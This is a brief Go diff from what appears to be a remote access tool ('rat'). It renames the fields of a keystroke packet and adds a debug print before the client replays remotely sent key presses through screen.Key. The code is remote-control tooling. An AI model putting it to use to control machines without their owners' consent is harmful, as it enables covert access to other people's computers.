@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	"rat/client/screen"
 	"rat/shared/network/header"
 
@@ -8,8 +9,8 @@ import (
 )
 
 type KeyPacket struct {
-	Key  int "keyCode"
-	Type int "state"
+	KeyCode int
+	State   int
 }
 
 func (packet KeyPacket) Header() header.PacketHeader {
@@ -17,7 +18,9 @@ func (packet KeyPacket) Header() header.PacketHeader {
 }
 
 func (packet KeyPacket) OnReceive() error {
-	screen.Key(uint16(packet.Key), packet.Type)
+	fmt.Println("key", packet)
+
+	screen.Key(uint16(packet.KeyCode), packet.State)
 
 	return nil
 }
